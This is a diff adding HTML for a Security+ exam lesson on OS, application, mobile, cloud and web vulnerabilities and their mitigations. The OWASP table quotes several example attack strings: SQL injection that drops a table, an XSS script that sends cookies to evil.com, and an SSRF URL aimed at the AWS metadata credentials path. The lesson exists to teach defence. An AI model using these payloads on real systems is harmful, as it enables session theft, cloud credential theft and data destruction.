+              <a class="dive-download" href="lesson04-part01.png" download="lesson04-part01.png">&#8675; Download PNG</a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="flip-wrapper" onclick="this.classList.toggle('flipped')" tabindex="0" onkeypress="if(event.key==='Enter')this.classList.toggle('flipped')">
+        <div class="flip-inner">
+          <div class="flip-front">
+            <div>
+              <div class="flip-num">02</div>
+              <h3>Cloud &amp; Web Vulnerabilities</h3>
+              <p>Cloud misconfigurations, insecure APIs, excessive permissions, the OWASP Top 10, injection attacks, XSS, and SSRF.</p>
+            </div>
+            <div class="flip-hint">🔄 Click to flip</div>
+          </div>
+          <div class="flip-back">
+            <div>
+              <h3>Cloud &amp; Web</h3>
+              <p>Cloud breaches are dominated by misconfiguration (open S3 buckets, public snapshots, over-privileged IAM roles). Web application flaws include the OWASP Top 10: SQL injection, broken authentication, XSS, SSRF, and insecure deserialization. Each has distinct testing and mitigation patterns.</p>
+            </div>
+            <div class="flip-back-links">
+              <a class="dive-link" href="lesson04-part02.png" target="_blank" rel="noopener">View Graphic &#8594;</a>
+              <a class="dive-download" href="lesson04-part02.png" download="lesson04-part02.png">&#8675; Download PNG</a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="flip-wrapper" onclick="this.classList.toggle('flipped')" tabindex="0" onkeypress="if(event.key==='Enter')this.classList.toggle('flipped')">
+        <div class="flip-inner">
+          <div class="flip-front">
+            <div>
+              <div class="flip-num">03</div>
+              <h3>Mitigation Strategies</h3>
+              <p>Patching, hardening, segmentation, isolation, and access control — building a layered defense that closes multiple vulnerability classes simultaneously.</p>
+            </div>
+            <div class="flip-hint">🔄 Click to flip</div>
+          </div>
+          <div class="flip-back">
+            <div>
+              <h3>Mitigation Strategies</h3>
+              <p>No single mitigation closes all vulnerabilities. Effective defense layers patching (eliminate known flaws), hardening (reduce attack surface), segmentation (contain breaches), isolation (quarantine risk), and access control (limit blast radius) — each addressing different attack paths.</p>
+            </div>
+            <div class="flip-back-links">
+              <a class="dive-link" href="lesson04-part03.png" target="_blank" rel="noopener">View Graphic &#8594;</a>
+              <a class="dive-download" href="lesson04-part03.png" download="lesson04-part03.png">&#8675; Download PNG</a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ============================================================
+       TOPIC 1 — OS, APPLICATION, MOBILE
+       ============================================================ -->
+  <div class="section-gap">
+    <div class="section-label">Topic 1 Content</div>
+    <div class="topic-section">
+      <div class="topic-header">
+        <div class="topic-header-num">1</div>
+        <div>
+          <h3>OS, Application &amp; Mobile Vulnerabilities</h3>
+          <p>Technical weaknesses in system software, applications, and mobile platforms — and how attackers exploit them</p>
+        </div>
+      </div>
+      <div class="topic-body">
+        <p style="color:var(--text-mid);font-size:0.92rem;margin-bottom:18px;">Vulnerabilities exist at every layer of the software stack. Security+ tests your ability to recognize them by name, understand their exploitation mechanics, and know which mitigation strategy eliminates or reduces each class of risk.</p>
+
+        <!-- CVSS Visual -->
+        <div style="background:var(--bg-soft);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:20px;">
+          <h4 style="font-size:0.9rem;color:var(--green-dark);margin-bottom:12px;">📊 CVSS Severity Scale — Understanding Vulnerability Ratings</h4>
+          <p style="font-size:0.83rem;color:var(--text-mid);margin-bottom:12px;">The Common Vulnerability Scoring System (CVSS) provides a standardized 0–10 score for every published vulnerability (CVE). Security teams use CVSS scores to prioritize patch deployment — but business context and exploitability-in-the-wild must also inform decisions.</p>
+          <div class="cvss-bar-wrap">
+            <div class="cvss-row"><span class="cvss-label">Critical (9.0–10.0)</span><div class="cvss-bar-bg"><div class="cvss-bar-fill fill-critical" style="width:100%;"></div></div><span class="cvss-score" style="color:var(--red);">10.0</span></div>
+            <div class="cvss-row"><span class="cvss-label">High (7.0–8.9)</span><div class="cvss-bar-bg"><div class="cvss-bar-fill fill-high" style="width:80%;"></div></div><span class="cvss-score" style="color:var(--amber);">8.0</span></div>
+            <div class="cvss-row"><span class="cvss-label">Medium (4.0–6.9)</span><div class="cvss-bar-bg"><div class="cvss-bar-fill fill-medium" style="width:55%;"></div></div><span class="cvss-score" style="color:var(--blue);">5.5</span></div>
+            <div class="cvss-row"><span class="cvss-label">Low (0.1–3.9)</span><div class="cvss-bar-bg"><div class="cvss-bar-fill fill-low" style="width:28%;"></div></div><span class="cvss-score" style="color:var(--green);">2.0</span></div>
+          </div>
+          <p style="font-size:0.8rem;color:var(--text-muted);margin-top:10px;"><strong>Exam tip:</strong> CVSS score alone does not determine patch priority. A CVSS 7.0 vulnerability with active exploitation in the wild targeting your specific OS may be more urgent than a CVSS 9.8 with no known exploits. CISA's Known Exploited Vulnerabilities (KEV) catalog adds exploitability context.</p>
+        </div>
+
+        <h4 style="font-size:0.95rem;color:var(--green-dark);margin-bottom:14px;">Operating System Vulnerabilities</h4>
+        <div class="topic-grid">
+          <div class="vuln-card">
+            <h4>💻 Privilege Escalation <span class="sev-badge sev-critical">Critical</span></h4>
+            <p>An attacker with limited (unprivileged) access exploits a kernel flaw or misconfigured service to gain administrator/root privileges. Local privilege escalation (LPE) is the standard second step after initial access — the attacker lands as a low-privilege user, then escalates.</p>
+            <ul>
+              <li><strong>Examples:</strong> Dirty Pipe (CVE-2022-0847), PrintNightmare, EternalBlue</li>
+              <li><strong>Indicators:</strong> New admin accounts created, unexpected SUID binaries (Linux)</li>
+              <li><strong>Mitigation:</strong> Timely kernel patching, principle of least privilege, application whitelisting</li>
+            </ul>
+          </div>
+          <div class="vuln-card">
+            <h4>🔓 Unpatched Services &amp; EOL Systems <span class="sev-badge sev-high">High</span></h4>
+            <p>Systems running outdated OS versions or unpatched services expose known CVEs with published exploits. End-of-Life (EOL) systems (Windows Server 2008, Windows XP) no longer receive vendor patches — every future CVE is a permanent vulnerability on that system.</p>
+            <ul>
+              <li><strong>Risk multiplier:</strong> Once a CVE is public, exploit modules are often available in Metasploit within 24–72 hours</li>
+              <li><strong>Mitigation:</strong> Patch management program, OS upgrade cadence, network isolation for unavoidable EOL systems</li>
+            </ul>
+          </div>
+          <div class="vuln-card">
+            <h4>⚡ Race Conditions &amp; TOCTOU <span class="sev-badge sev-high">High</span></h4>
+            <p>A race condition occurs when a program's behavior depends on the sequence or timing of uncontrollable events. Time-of-Check to Time-of-Use (TOCTOU) is a specific race condition where an attacker modifies a resource between when its permissions are checked and when it is actually used.</p>
+            <ul>
+              <li><strong>Example:</strong> Checking if a file is safe, then replacing it with a malicious file before it is opened</li>
+              <li><strong>Mitigation:</strong> Atomic operations, mutex locking, secure coding practices</li>
+            </ul>
+          </div>
+          <div class="vuln-card">
+            <h4>🔮 Side-Channel Attacks <span class="sev-badge sev-medium">Medium</span></h4>
+            <p>Attacks that extract information from a system's physical implementation — power consumption, electromagnetic emissions, cache timing, or acoustic signals — rather than exploiting software logic. Spectre and Meltdown (2018) exposed CPU architecture weaknesses that allowed cross-process memory reads via speculative execution timing.</p>
+            <ul>
+              <li><strong>Notable:</strong> Spectre, Meltdown, Rowhammer, FLUSH+RELOAD cache attacks</li>
+              <li><strong>Mitigation:</strong> CPU microcode updates, OS kernel patches, process isolation</li>
+            </ul>
+          </div>
+        </div>
+
+        <h4 style="font-size:0.95rem;color:var(--green-dark);margin-top:24px;margin-bottom:14px;">Application Vulnerabilities</h4>
+        <div class="topic-grid">
+          <div class="vuln-card" style="border-left-color:var(--red);">
+            <h4>📦 Buffer Overflow <span class="sev-badge sev-critical">Critical</span></h4>
+            <p>A buffer overflow occurs when a program writes more data to a fixed-size memory buffer than it can hold, overwriting adjacent memory. An attacker can craft the overflow payload to overwrite the return address on the stack, redirecting execution to attacker-controlled shellcode.</p>
+            <ul>
+              <li><strong>Types:</strong> Stack-based (most common), Heap-based (harder to exploit), Integer overflow (causes incorrect allocation sizing)</li>
+              <li><strong>Defense:</strong> Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP/NX bit), stack canaries, safe coding functions (strncpy vs. strcpy)</li>
+              <li><strong>Exam tip:</strong> Buffer overflows are code execution vulnerabilities — they can violate all three CIA properties</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--purple);">
+            <h4>🎭 Default Credentials &amp; Insecure Defaults <span class="sev-badge sev-critical">Critical</span></h4>
+            <p>Factory-set or vendor-default usernames and passwords (admin/admin, admin/password) left in place on deployed systems. Shodan and similar tools continuously scan the internet for devices with default credentials — thousands of devices are compromised this way daily.</p>
+            <ul>
+              <li><strong>Scope:</strong> Routers, IoT devices, network appliances, databases (MySQL root with no password), development frameworks</li>
+              <li><strong>Mitigation:</strong> Change all defaults before deployment; include in hardening checklists; vulnerability scanning to detect remaining defaults</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--blue);">
+            <h4>🧩 Improper Error Handling &amp; Information Disclosure <span class="sev-badge sev-medium">Medium</span></h4>
+            <p>Applications that return verbose error messages expose stack traces, database schemas, internal IP addresses, software versions, and file paths — all valuable for reconnaissance. Information disclosure turns a low-severity finding into a force multiplier for other attacks.</p>
+            <ul>
+              <li><strong>Example:</strong> A PHP error revealing the full file path and database connection string</li>
+              <li><strong>Mitigation:</strong> Custom error pages in production, log errors internally not in responses, suppress version banners</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--teal);">
+            <h4>🔗 Third-Party Libraries &amp; Dependency Risk <span class="sev-badge sev-high">High</span></h4>
+            <p>Modern applications incorporate dozens to hundreds of open-source dependencies. A vulnerability in any dependency affects every application that uses it — Log4Shell (CVE-2021-44228) demonstrated this catastrophically: the Log4j logging library was embedded in thousands of products and services worldwide, resulting in a CVSS 10.0 critical RCE vulnerability affecting enterprises globally.</p>
+            <ul>
+              <li><strong>Mitigation:</strong> Software Composition Analysis (SCA) tools, SBOM, dependency pinning, regular dependency audits</li>
+            </ul>
+          </div>
+        </div>
+
+        <h4 style="font-size:0.95rem;color:var(--green-dark);margin-top:24px;margin-bottom:14px;">Mobile Platform Vulnerabilities</h4>
+        <div class="topic-grid-3">
+          <div class="vuln-card" style="border-left-color:var(--amber);">
+            <h4>📲 Sideloading &amp; Unofficial Sources</h4>
+            <p>Installing apps from outside the official App Store or Google Play bypasses vendor review processes. Sideloaded apps may contain trojans, spyware, or ransomware. Android's "Unknown Sources" permission enables sideloading; iOS requires jailbreaking.</p>
+            <ul>
+              <li><strong>Mitigation:</strong> MDM policy blocking sideloading, user training, app allowlisting</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--amber);">
+            <h4>💾 Insecure Data Storage</h4>
+            <p>Mobile apps that store sensitive data (credentials, session tokens, PII) in plaintext in SharedPreferences, SQLite databases, or SD card directories expose that data to other apps or physical access attacks. Backup files may also expose stored data.</p>
+            <ul>
+              <li><strong>Mitigation:</strong> Encrypt sensitive data at rest, use Android Keystore / iOS Keychain, disable backup for sensitive apps</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--amber);">
+            <h4>🔐 Excessive App Permissions</h4>
+            <p>Apps that request more permissions than necessary (camera, microphone, location, contacts, SMS) create unnecessary exposure. A malicious or compromised app with broad permissions becomes a surveillance tool. OWASP Mobile Top 10 consistently lists improper platform usage as a top risk.</p>
+            <ul>
+              <li><strong>Mitigation:</strong> Review app permissions, MDM to enforce permission policies, OS-level permission auditing</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="callout-amber">
+          <strong>Exam Focus — Vulnerability vs. Exploit vs. Threat:</strong> These terms are frequently confused. A <strong>vulnerability</strong> is the weakness (e.g., an unpatched buffer overflow). An <strong>exploit</strong> is the action that takes advantage of it (e.g., sending a crafted packet that overwrites the return address). The <strong>threat</strong> is the combination of a threat actor with the capability and intent to use the exploit. Security+ scenario questions often describe an exploit and ask you to identify the underlying vulnerability class.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       TOPIC 2 — CLOUD & WEB VULNERABILITIES
+       ============================================================ -->
+  <div class="section-gap">
+    <div class="section-label">Topic 2 Content</div>
+    <div class="topic-section">
+      <div class="topic-header" style="background:var(--green-dark);">
+        <div class="topic-header-num">2</div>
+        <div>
+          <h3>Cloud &amp; Web Application Vulnerabilities</h3>
+          <p>Misconfigurations, insecure APIs, OWASP Top 10, and the modern web application attack surface</p>
+        </div>
+      </div>
+      <div class="topic-body">
+        <p style="color:var(--text-mid);font-size:0.92rem;margin-bottom:18px;">The cloud and web application attack surface has become the primary battleground in modern security. Gartner consistently reports that over 95% of cloud security failures are the customer's fault — not the provider's — driven almost entirely by misconfiguration. Web application vulnerabilities are the leading cause of data breaches in internet-facing systems.</p>
+
+        <h4 style="font-size:0.95rem;color:var(--green-dark);margin-bottom:14px;">Cloud Vulnerabilities</h4>
+        <div class="topic-grid">
+          <div class="vuln-card" style="border-left-color:var(--red);">
+            <h4>☁️ Cloud Misconfiguration <span class="sev-badge sev-critical">Critical</span></h4>
+            <p>The #1 cause of cloud breaches. Misconfiguration encompasses any incorrect or insecure cloud resource setting that exposes data or functionality to unauthorized access. The Shared Responsibility Model means the cloud provider secures the infrastructure, but the customer is responsible for configuring their resources securely.</p>
+            <ul>
+              <li><strong>Examples:</strong> Public S3 buckets exposing millions of records, publicly accessible RDS snapshots, unrestricted security group rules (0.0.0.0/0), disabled MFA on root/admin accounts, verbose CloudTrail logging disabled</li>
+              <li><strong>Mitigation:</strong> Cloud Security Posture Management (CSPM) tools, CIS Cloud Benchmarks, infrastructure-as-code security scanning, regular configuration audits</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--purple);">
+            <h4>🔑 Insecure IAM &amp; Excessive Permissions <span class="sev-badge sev-critical">Critical</span></h4>
+            <p>Over-permissive IAM roles, inline policies granting AdministratorAccess to service accounts, and hard-coded API keys in source code or container images create massive attack surface. The principle of least privilege is systematically violated in most cloud environments due to the ease of granting broad permissions.</p>
+            <ul>
+              <li><strong>Examples:</strong> Lambda function with full S3 write access when it only needs read; EC2 instance profile with IAM full access; API keys committed to public GitHub repositories</li>
+              <li><strong>Mitigation:</strong> IAM Access Analyzer, permission boundary policies, regular privilege reviews, secrets management (AWS Secrets Manager, HashiCorp Vault), git pre-commit hooks to detect API keys</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--blue);">
+            <h4>🔌 Insecure APIs &amp; Serverless Risk <span class="sev-badge sev-high">High</span></h4>
+            <p>Cloud workloads expose APIs for integration. Unauthenticated or weakly authenticated APIs, APIs lacking rate limiting, and APIs with verbose error messages create significant attack surface. Serverless functions (Lambda, Azure Functions) can inherit overly permissive execution roles, and their event-driven nature creates injection risks through untrusted input sources.</p>
+            <ul>
+              <li><strong>OWASP API Security Top 10:</strong> Broken Object Level Authorization, Broken Authentication, Excessive Data Exposure are the top three</li>
+              <li><strong>Mitigation:</strong> API gateways with authentication, OAuth 2.0 / OIDC, input validation, rate limiting, WAF in front of APIs</li>
+            </ul>
+          </div>
+          <div class="vuln-card" style="border-left-color:var(--teal);">
+            <h4>🏗️ Virtualization &amp; Container Vulnerabilities <span class="sev-badge sev-high">High</span></h4>
+            <p>Virtual machine escape vulnerabilities allow an attacker who has compromised a guest VM to break out to the hypervisor host, affecting all VMs on that host. Container security risks include privileged containers, containers running as root, shared kernel vulnerabilities (containers share the host OS kernel), and insecure container images with known CVEs.</p>
+            <ul>
+              <li><strong>Examples:</strong> Dirty COW enabling container escape, unscanned container images with Log4Shell</li>
+              <li><strong>Mitigation:</strong> Hypervisor patching, container image scanning (Trivy, Snyk), non-root containers, read-only filesystems, namespace isolation</li>
+            </ul>
+          </div>
+        </div>
+
+        <h4 style="font-size:0.95rem;color:var(--green-dark);margin-top:24px;margin-bottom:14px;">Web Application Vulnerabilities — OWASP Top 10</h4>
+        <p style="font-size:0.87rem;color:var(--text-mid);margin-bottom:14px;">The OWASP (Open Web Application Security Project) Top 10 is the authoritative reference for web application vulnerabilities. CompTIA Security+ SY0-701 directly tests several of these — you must know the attack mechanism, a concrete example, and the primary mitigation for each.</p>
+
+        <table class="web-table">
+          <thead>
+            <tr>
+              <th style="width:18%">Vulnerability</th>
+              <th style="width:25%">Attack Mechanism</th>
+              <th style="width:28%">Concrete Example</th>
+              <th>Primary Mitigation</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Injection (SQL, OS, LDAP)</strong></td>
+              <td>Untrusted user input is passed directly to an interpreter. Attacker injects commands that the interpreter executes with the application's privileges.</td>
+              <td>Login form: <code>' OR '1'='1</code> bypasses authentication; <code>'; DROP TABLE users;--</code> destroys data</td>
+              <td>Parameterized queries (prepared statements), stored procedures, input validation, WAF</td>
+            </tr>
+            <tr>
+              <td><strong>Broken Authentication</strong></td>
+              <td>Weak session management, predictable session IDs, missing account lockout, or credential stuffing allows attackers to assume other users' identities.</td>
+              <td>Session fixation attack; JWT token with "alg:none" accepted by server; account with no MFA accessible via credential stuffing</td>
+              <td>MFA, strong session token generation, account lockout, secure cookie flags (HttpOnly, Secure, SameSite)</td>
+            </tr>
+            <tr>
+              <td><strong>XSS (Cross-Site Scripting)</strong></td>
+              <td>Attacker injects malicious client-side scripts into pages viewed by other users. Stored XSS persists in the database; Reflected XSS is returned in the response; DOM-based XSS modifies the DOM.</td>
+              <td>Forum post containing <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code> steals every visitor's session cookie</td>
+              <td>Output encoding/escaping, Content Security Policy (CSP), input validation, HttpOnly cookies</td>
+            </tr>
+            <tr>
+              <td><strong>Insecure Direct Object Reference (IDOR)</strong></td>
+              <td>Application exposes internal implementation objects (database keys, file paths) in URLs without verifying the requesting user is authorized to access that specific object.</td>
+              <td>Changing <code>/invoice?id=1042</code> to <code>/invoice?id=1043</code> returns another customer's invoice without authorization check</td>
+              <td>Server-side authorization checks on every request, indirect reference maps, access control testing</td>
+            </tr>
+            <tr>
+              <td><strong>Security Misconfiguration</strong></td>
+              <td>Default configurations, unnecessary features, verbose error messages, missing security headers, or open cloud storage expose sensitive data and functionality.</td>
+              <td>Admin panel accessible at /admin with default credentials; DEBUG=True in production Django app exposing source code; missing HSTS header</td>
+              <td>Hardening checklists, automated configuration scanning, remove unused features, security headers (HSTS, CSP, X-Frame-Options)</td>
+            </tr>
+            <tr>
+              <td><strong>SSRF (Server-Side Request Forgery)</strong></td>
+              <td>Attacker induces the server to make HTTP requests to internal resources or cloud metadata APIs. In cloud environments, SSRF can retrieve IAM credentials from the instance metadata service.</td>
+              <td>URL parameter <code>url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> retrieves AWS IAM credentials from EC2 metadata service</td>
+              <td>Validate and allowlist server-side request destinations, disable metadata service or enforce IMDSv2, network egress controls</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div class="callout-red">
+          <strong>SSRF is an Exam Hot Topic in SY0-701:</strong> SSRF was elevated to the OWASP Top 10 in 2021 specifically because of its impact in cloud environments. The Capital One breach (2019) exploited an SSRF vulnerability to retrieve AWS IAM credentials from the EC2 metadata service, enabling access to over 100 million customer records. Expect SSRF-related scenarios on the exam — know the mechanism (server fetches attacker-controlled URL), the cloud impact (metadata credential theft), and the mitigation (IMDSv2 enforcement, request allowlisting).
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       TOPIC 3 — MITIGATION STRATEGIES
+       ============================================================ -->
+  <div class="section-gap">
+    <div class="section-label">Topic 3 Content</div>
+    <div class="topic-section">
+      <div class="topic-header" style="background:var(--green-mid);">
+        <div class="topic-header-num">3</div>
+        <div>
+          <h3>Mitigation Strategies</h3>
+          <p>Patching, hardening, segmentation, isolation, and access control — the defender's toolkit</p>
+        </div>
+      </div>
+      <div class="topic-body">
+        <p style="color:var(--text-mid);font-size:0.92rem;margin-bottom:18px;">Identifying vulnerabilities is only half the job. Mitigating them — systematically reducing exploitability and blast radius — is the other half. Security+ tests your ability to select the <em>most appropriate</em> mitigation for a described vulnerability. Understanding what each mitigation strategy does and does not do is essential for answering these questions correctly.</p>
+
+        <div class="topic-grid">
+          <div class="mit-card">
+            <h4><span class="concept-icon">🔄</span> Patching &amp; Patch Management</h4>
+            <p>Patching directly eliminates known vulnerabilities by replacing vulnerable code with vendor-provided fixes. An effective patch management program includes:</p>
+            <ul style="font-size:0.84rem;color:var(--text-mid);margin-top:8px;">
+              <li><strong>Inventory:</strong> Know every asset and software version in your environment</li>
+              <li><strong>Detection:</strong> Vulnerability scanners (Nessus, Qualys) identify unpatched CVEs</li>
+              <li><strong>Prioritization:</strong> Critical/High CVSS + active exploitation = immediate patching; others follow defined SLAs (e.g., 30/60/90 days by severity)</li>
+              <li><strong>Testing:</strong> Patches tested in staging before production deployment to prevent service disruptions</li>
+              <li><strong>Verification:</strong> Post-patch scanning confirms the vulnerability is closed</li>
+              <li><strong>Limitation:</strong> Cannot patch zero-days; cannot patch EOL systems without vendor support; patching alone doesn't address misconfiguration</li>
+            </ul>
+          </div>
+          <div class="mit-card">
+            <h4><span class="concept-icon">🛡️</span> System Hardening</h4>
+            <p>Hardening reduces a system's attack surface by removing everything unnecessary. A hardened system has fewer entry points even when vulnerabilities exist in installed components.</p>
+            <ul style="font-size:0.84rem;color:var(--text-mid);margin-top:8px;">
+              <li><strong>Disable unused services:</strong> A web server running FTP, Telnet, and SNMP has three unnecessary attack vectors — disable all of them</li>
+              <li><strong>Remove default accounts:</strong> Delete or disable all vendor-default usernames; change all default passwords</li>
+              <li><strong>Secure configuration baselines:</strong> CIS Benchmarks, DISA STIGs, and vendor security guides provide hardening checklists</li>
+              <li><strong>Enable security features:</strong> ASLR, DEP, Secure Boot, full-disk encryption, audit logging</li>
+              <li><strong>Close unnecessary ports:</strong> Run <code>netstat -tulnp</code> — every listening port is a potential entry point</li>
+              <li><strong>OS-specific:</strong> Windows (Group Policy, AppLocker), Linux (SELinux/AppArmor, minimal package installation)</li>
+            </ul>
+          </div>
+          <div class="mit-card">
+            <h4><span class="concept-icon">🏗️</span> Network Segmentation</h4>
+            <p>Segmentation divides the network into isolated zones, containing breaches and limiting an attacker's ability to move laterally after initial compromise. Without segmentation, a phishing compromise of a finance workstation gives the attacker a direct path to the database server.</p>
+            <ul style="font-size:0.84rem;color:var(--text-mid);margin-top:8px;">
+              <li><strong>VLAN segmentation:</strong> Separate user, server, management, and guest traffic at Layer 2</li>
+              <li><strong>DMZ (Demilitarized Zone):</strong> Internet-facing servers (web, email, DNS) placed in a DMZ separated from the internal network by a firewall on each side</li>
+              <li><strong>Micro-segmentation:</strong> Zero-trust network access — every workload is isolated; east-west traffic requires explicit authorization (implemented via software-defined networking)</li>
+              <li><strong>Air-gapping:</strong> Complete physical network separation for the most sensitive systems (ICS, classified networks)</li>
+            </ul>
+          </div>
+          <div class="mit-card">
+            <h4><span class="concept-icon">🔒</span> Isolation &amp; Sandboxing</h4>
+            <p>Isolation goes beyond segmentation — it contains a specific system, process, or application so that any compromise cannot spread. Sandboxing is a form of isolation used to analyze suspicious files or run untrusted code in a contained environment.</p>
+            <ul style="font-size:0.84rem;color:var(--text-mid);margin-top:8px;">
+              <li><strong>VM isolation:</strong> Each VM is isolated from other VMs; hypervisor enforces boundaries</li>
+              <li><strong>Container isolation:</strong> Namespaces and cgroups limit container resource access</li>
+              <li><strong>Browser sandboxing:</strong> Chrome renders each tab in an isolated process to prevent drive-by malware from accessing other browser data</li>
+              <li><strong>Malware sandboxes:</strong> Cuckoo, Any.run — safely detonate suspicious files to observe behavior without risking production systems</li>
+              <li><strong>ICS/OT isolation:</strong> Operational technology networks should be fully isolated from IT networks</li>
+            </ul>
+          </div>
+          <div class="mit-card">
+            <h4><span class="concept-icon">🎯</span> Access Control &amp; Least Privilege</h4>
+            <p>Limiting what users and systems can access reduces the blast radius of any compromise. A workstation infected with ransomware that runs as a standard user account can only encrypt files that account has write access to — not the entire file server.</p>
+            <ul style="font-size:0.84rem;color:var(--text-mid);margin-top:8px;">
+              <li><strong>Least privilege:</strong> Grant only the minimum permissions needed for a specific task; review and revoke permissions regularly</li>
+              <li><strong>Role-Based Access Control (RBAC):</strong> Permissions assigned to roles, not individuals; users inherit permissions through role membership</li>
+              <li><strong>Privileged Access Management (PAM):</strong> Just-in-time (JIT) access for admin credentials; time-limited elevation; all privileged sessions recorded</li>
+              <li><strong>Multi-Factor Authentication:</strong> Compensating control that reduces the value of stolen credentials even when access control boundaries are crossed</li>
+            </ul>
+          </div>
+          <div class="mit-card">
+            <h4><span class="concept-icon">✅</span> Input Validation &amp; Secure Coding</h4>
+            <p>Many of the most severe web and application vulnerabilities (injection, XSS, buffer overflow) are fundamentally caused by trusting user-supplied input. Input validation is the primary preventive control for this entire class of vulnerabilities.</p>
+            <ul style="font-size:0.84rem;color:var(--text-mid);margin-top:8px;">
+              <li><strong>Allowlist validation:</strong> Only accept known-good input patterns — reject everything else</li>
+              <li><strong>Parameterized queries:</strong> Separate SQL code from data — eliminates SQL injection</li>
+              <li><strong>Output encoding:</strong> Encode user-supplied data before rendering in HTML — eliminates XSS</li>
+              <li><strong>SAST/DAST:</strong> Static Application Security Testing (code review) and Dynamic Application Security Testing (runtime testing) catch vulnerabilities during development</li>
+            </ul>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;background:var(--bg-soft);border:1px solid var(--border);border-radius:var(--radius);padding:18px;">
+          <h4 style="font-size:0.92rem;color:var(--green-dark);margin-bottom:12px;">🎯 Mitigation Selection Framework — Which Strategy for Which Vulnerability?</h4>
+          <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
+              <thead>
+                <tr style="background:var(--green-dark);color:#fff;">
+                  <th style="padding:9px 12px;text-align:left;">Vulnerability Class</th>
+                  <th style="padding:9px 12px;text-align:left;">Primary Mitigation</th>
+                  <th style="padding:9px 12px;text-align:left;">Supporting Mitigation</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Unpatched OS/App CVE</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Patching</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Network isolation (if patch unavailable), compensating controls</td></tr>
+                <tr style="background:var(--bg-soft);"><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Default credentials / insecure defaults</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Hardening (change defaults)</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">MFA, network ACLs to limit admin interface exposure</td></tr>
+                <tr><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">SQL Injection / XSS</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Input validation / secure coding</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">WAF, CSP, parameterized queries</td></tr>
+                <tr style="background:var(--bg-soft);"><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Lateral movement after breach</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Network segmentation</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Micro-segmentation, ZTNA, host-based firewall</td></tr>
+                <tr><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Ransomware blast radius</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Access control / least privilege</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Segmentation, immutable backups, EDR</td></tr>
+                <tr style="background:var(--bg-soft);"><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Cloud misconfiguration</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">Hardening (CSPM, CIS Benchmarks)</td><td style="padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text-mid);">IaC security scanning, least-privilege IAM, audit logging</td></tr>
+                <tr><td style="padding:8px 12px;color:var(--text-mid);">Malware analysis / suspicious file</td><td style="padding:8px 12px;color:var(--text-mid);">Isolation / sandboxing</td><td style="padding:8px 12px;color:var(--text-mid);">EDR behavioral detection, application whitelisting</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="callout">
+          <strong>Defense in Depth:</strong> No mitigation strategy is sufficient in isolation. A patched system that is not hardened may still expose unnecessary services. A hardened system without segmentation gives an attacker full lateral movement once compromised. A segmented network with weak access control can still be pivoted through with stolen privileged credentials. Effective security stacks mitigations — patch + harden + segment + isolate + control access — so that an attacker must defeat multiple independent layers to succeed.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       ACTIVITY 1 — DRAG & DROP: MITIGATION MATCHER
+       ============================================================ -->
+  <div class="section-gap">
+    <div class="section-label">Interactive Activity 1</div>
+    <div class="activity-box">
+      <div class="activity-header">
+        <span class="activity-badge">Activity 1</span>
+        <div>
+          <h3>Mitigation Matcher — Drag &amp; Drop</h3>
+          <p>Match each vulnerability scenario to its primary mitigation strategy</p>
+        </div>
+      </div>
+      <div class="activity-body">
+        <div class="activity-instructions">
+          <strong>Instructions:</strong> Drag each vulnerability chip from the pool below into the mitigation strategy zone it BEST addresses. Multiple vulnerabilities may fit one zone. Submit to check your answers — red chips are mismatched and can be moved. Click × to return a chip.
+        </div>
+
+        <div class="drag-pool" id="dp4">
+          <div class="drag-item" draggable="true" data-answer="Patching" id="d4-1">Unpatched Apache Log4j (Log4Shell)</div>
+          <div class="drag-item" draggable="true" data-answer="Hardening" id="d4-2">Router using admin/admin credentials</div>
